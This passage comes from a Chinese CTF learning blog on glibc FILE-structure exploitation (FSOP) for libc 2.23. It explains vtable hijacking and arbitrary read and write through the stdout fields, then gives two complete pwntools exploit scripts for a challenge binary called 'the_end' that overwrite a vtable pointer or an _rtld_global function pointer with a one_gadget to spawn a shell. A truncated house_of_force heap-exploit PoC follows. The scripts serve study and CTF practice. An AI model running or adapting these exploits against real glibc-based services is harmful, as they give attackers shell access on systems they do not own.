class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's see what FILE* have(x64):\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The fopen will malloc a chunk to store the FILE structure and return a ptr to the structure chunk"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's do fopen\n"</span>);</span><br><span class="line">	FILE *f=fopen(<span class="string">"test.txt"</span>,<span class="string">"r+"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we can see what exactly the structure have at the beginning:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we read something from the file(0x20)\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	fread(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer&lt;%s&gt;&lt;%#x&gt;\n"</span>,<span class="built_in">buffer</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="number">0</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,<span class="string">"bbbbbbbbbbbbbbbb"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we write something to the file('b'*0x10)\n"</span>);</span><br><span class="line">	fwrite(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>),f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Try fflush\n"</span>);</span><br><span class="line">	fflush(f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="number">0</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Read again(0x20)\n"</span>);</span><br><span class="line">	fread(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer&lt;%s&gt;&lt;%#x&gt;\n"</span>,<span class="built_in">buffer</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="string">'*'</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Write again('*'*0x20)\n"</span>);</span><br><span class="line">	fwrite(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	fflush(f);</span><br><span class="line">	</span><br><span class="line">	fclose(f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like(Use after free):\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中最主要的大概是fopen时malloc了一个0x230的chunk来存放结构体，然后第一次调用fread时分配了一个0x1000的文件缓冲区，第一次会把文件的全部内容都读到这个缓冲区里面（正确与否有待深究，自己看来暂时是这样）</p>
<p><img src="/2020/02/25/FSOP-the-end/1582612886398.png" alt="1582612886398"></p>
<p>_chain域的链接此时结构大概是：<code>_IO_list_all</code>-&gt;<code>f</code>-&gt;<code>_IO_2_1_stderr_</code>-&gt;<code>_IO_2_1_stdout_</code>-&gt;<code>_IO_2_1_stdin_</code>-&gt;NULL</p>
<p>其中<code>_IO_list_all</code>是一个变量，存储着指向f结构体的指针（以上图为例就是<code>0x603010</code>），f在fopen操作时初始化的FILE*就被链入了这个链表</p>
<p>再就是<code>fclose</code>会直接把对应的两个chunk一起释放了，释放顺序是先释放文件缓冲区再释放结构体chunk</p>
<h1 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h1><p>至于vtable在<code>_IO_FILE_plus</code>中的偏移量，摘自wiki就是：在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8（wiki）</p>
<p>如果我们伪造一个vtable，然后修改对应FILE结构体的vtable指针指向我们伪造的vtable，就可以达到劫持程序的目的（不得不说vtable大法好啊23333）</p>
<p>目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用（wiki）</p>
<p>vatble对应的段属性如下所示，在不可写段：</p>
<p><img src="/2020/02/25/FSOP-the-end/1582618757197.png" alt="1582618757197"></p>
<p>(wiki上面关于修改vtable的描述已经很详细了，这里不再赘述，主要是以记笔记为主)</p>
<p>因为 vtable 中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把 “sh” 写入<code>_IO_FILE_plus</code> 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)<br>（或者直接试着填<code>one_gadget</code>）</p>
<h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>（来自raycp师傅的博客）</p>
<p>控制<code>stdout</code>结构体满足以下条件实现任意泄露：</p>
<ul>
<li><code>_IO_write_base</code>指向想要泄露的地方。</li>
<li><code>_IO_write_ptr</code>指向泄露结束的地址。</li>
<li><code>_IO_read_end</code>等于<code>_IO_write_base</code>以绕过多余的代码。 满足这三个条件，可实现任意读。当然不包含结构体里的<code>_flags</code>字段的伪造，该字段都从原来的结构体里面复制过来，所以就没去分析该如何构造了。</li>
</ul>
<h1 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h1><p>（来自raycp师傅的博客）</p>
<p>当<code>_IO_write_end</code> 大于<code>_IO_write_ptr</code>时，<code>memcpy</code>就会调用</p>
<p>只需要将<code>_IO_write_ptr</code>指向需要写的地址，<code>_IO_write_end</code>指向结束位置即可</p>
<p>有了任意读与任意写之后，具体实现就是使用任意读泄露libc地址，然后用任意写将<code>one gadget</code>写到<code>malloc_hook</code>中，然后利用<code>%n</code>报错或者是较大的字符打印来触发malloc函数</p>
<h1 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h1><p>只看概念当然不代表会用了，肯定要写个题印象才深23333</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/02/25/FSOP-the-end/1582615573201.png" alt="1582615573201"></p>
<p>程序逻辑非常简单，就是给了一个libc地址，然后任意地址写5次，一次一字节，但是程序开启了PIE和Full RELRO，无法改写程序段的内容，这里我由于是第一次写FILE类型的题，所以就参考了师傅们的WP学了很多（看完的感触就是挖洞果然撸源码是王道啊….）</p>
<p> 当然还有从各路师傅那听来的<a href="http://blog.eonew.cn/archives/1173" target="_blank" rel="noopener">Ex师傅的博客</a>，真的学到了不少东西</p>
<h2 id="Exploit1"><a href="#Exploit1" class="headerlink" title="Exploit1"></a>Exploit1</h2><p>第一种办法是修改stdin/stdout/stderr任一FILE的vtable指针指向我们可控的区域，由于ubuntu libc2.23存放vtable的段不可写，所以不能直接改vtable。改指针的时候也特别巧妙，改的是指针第二个字节，所以可以在可写的段再去找合适的偏移，当然这里的解法都是参考raycp师傅学的新姿势，所以更清晰明了的解释就推荐去看原博主的文了</p>
<p>这个方法里面一共改了三处，5次：<br>第一处：stdin/stdout/stderr任一FILE的 <code>_IO_write_ptr</code>，使其大于<code>_IO_write_base</code><br>第二处：对应vtable指针第二字节，改写的地址对应偏移需要有libc地址<br>第三处：对应偏移处有libc地址，修改低三字节</p>
<p>可能自己接触比较新的就是在libc找合适的地方去改地址<br>我用的命令是 search -p 0x7fxxxx -w，在GDB里面可以直接找到可写的而且有这个地址的内存，然后通过我们需要的偏移比对哪个地址是我们需要的，因为vtable里面是存在偏移的，如果实在是找不到可能就失败了，当然找到的概率还是很大的，毕竟师傅们的利用都这么多了XD</p>
<p>ps：原来这个就是FSOP，开始还以为FSOP是更深一点的知识，然后点开wiki的FSOP之后发现就是这个23333，一举两得？</p>
<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./the_end'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''libc 2.23 x64</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeByte</span><span class="params">(address,Byte)</span>:</span></span><br><span class="line">	p.send(p64(address))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(Byte)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is a gift '</span>)</span><br><span class="line">libc_base=int(p.recv(len(<span class="string">'0x7f4ec6b9d230'</span>)),<span class="number">16</span>)-libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">loginfo(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"><span class="string">'''stdout</span></span><br><span class="line"><span class="string">stdout_IO_write_ptr=0x3c5648</span></span><br><span class="line"><span class="string">stdout_vtable_off=0x3c56f8</span></span><br><span class="line"><span class="string">address_off=0x3c53e0</span></span><br><span class="line"><span class="string">func_off=0x3c53f8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">stdin_IO_write_ptr=<span class="number">0x3c4908</span></span><br><span class="line">stdin_vtable_off=<span class="number">0x3c49b8</span></span><br><span class="line">address_off=<span class="number">0x3c53e0</span></span><br><span class="line">func_off=<span class="number">0x3c53f8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'brva 0x950')</span></span><br><span class="line">writeByte(stdin_IO_write_ptr+libc_base,<span class="string">'\xff'</span>)</span><br><span class="line">off=address_off+libc_base</span><br><span class="line">off=(off&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">off=chr(off)</span><br><span class="line">writeByte(stdin_vtable_off+libc_base+<span class="number">1</span>,off)</span><br><span class="line">one_off=<span class="number">0xf1147</span>+libc_base</span><br><span class="line">one_off1=chr(one_off&amp;<span class="number">0xff</span>)</span><br><span class="line">one_off2=chr((one_off&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">one_off3=chr((one_off&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">writeByte(func_off+libc_base,one_off1)</span><br><span class="line">writeByte(func_off+libc_base+<span class="number">1</span>,one_off2)</span><br><span class="line">writeByte(func_off+libc_base+<span class="number">2</span>,one_off3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Exploit2"><a href="#Exploit2" class="headerlink" title="Exploit2"></a>Exploit2</h2><p>第二种方法真的是让我感受到了函数指针的伟大23333，简直是Control the ptr ，control the world，这些利用都太奇妙了，再就是源码大法好，以后一定要多看看源码</p>
<p>这里是直接修改的<code>_rtld_global._dl_rtld_lock_recursive</code>这个函数指针….甚至是直接修改地址第三位就可以了…真的tql，被师傅们强大到，以后菜鸡一定多看看源码</p>
<p>直接放exp吧都没什么好写的了23333</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./the_end'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''libc 2.23 x64</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeByte</span><span class="params">(address,Byte)</span>:</span></span><br><span class="line">	p.send(p64(address))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(Byte)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is a gift '</span>)</span><br><span class="line">libc_base=int(p.recv(len(<span class="string">'0x7f4ec6b9d230'</span>)),<span class="number">16</span>)-libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">loginfo(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">ptr_off_set=<span class="number">0x5f0f48</span></span><br><span class="line">one_gadget=<span class="number">0xf02a4</span>+libc_base</span><br><span class="line">off1=one_gadget&amp;<span class="number">0xff</span></span><br><span class="line">off2=(one_gadget&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">off3=(one_gadget&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'brva 0x950')</span></span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set+<span class="number">1</span>,chr(off2))</span><br><span class="line">writeByte(libc_base+ptr_off_set+<span class="number">2</span>,chr(off3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/" class="post-title-link" itemprop="url">how2heap - house_of_force&cookbook、bcloud</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-22 18:42:29" itemprop="dateCreated datePublished" datetime="2020-02-22T18:42:29+08:00">2020-02-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:07:43" itemprop="dateModified" datetime="2020-02-29T18:07:43+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-house-of-force-amp-cookbook、bcloud"><a href="#how2heap-house-of-force-amp-cookbook、bcloud" class="headerlink" title="how2heap - house_of_force&amp;cookbook、bcloud"></a>how2heap - house_of_force&amp;cookbook、bcloud</h1><p>ubuntu16.04 libc2.23</p>
<h1 id="house-of-force-c"><a href="#house-of-force-c" class="headerlink" title="house_of_force.c"></a>house_of_force.c</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   This PoC works also with ASLR enabled.</span><br><span class="line">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span><br><span class="line">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span><br><span class="line">   ( http:&#x2F;&#x2F;phrack.org&#x2F;issues&#x2F;66&#x2F;10.html )</span><br><span class="line">   Tested in Ubuntu 14.04, 64bit.</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">		&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">	fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nLet&#39;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">	intptr_t *p1 &#x3D; malloc(256);&#x2F;&#x2F;0x100</span><br><span class="line">	fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - 2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk&#x2F;wilderness.\n&quot;);</span><br><span class="line">	int real_size &#x3D; malloc_usable_size(p1);</span><br><span class="line">	fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nNow let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;----- VULNERABILITY ----</span><br><span class="line">	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">	fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;</span><br><span class="line">	fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">	&#x2F;&#x2F;------------------------</span><br><span 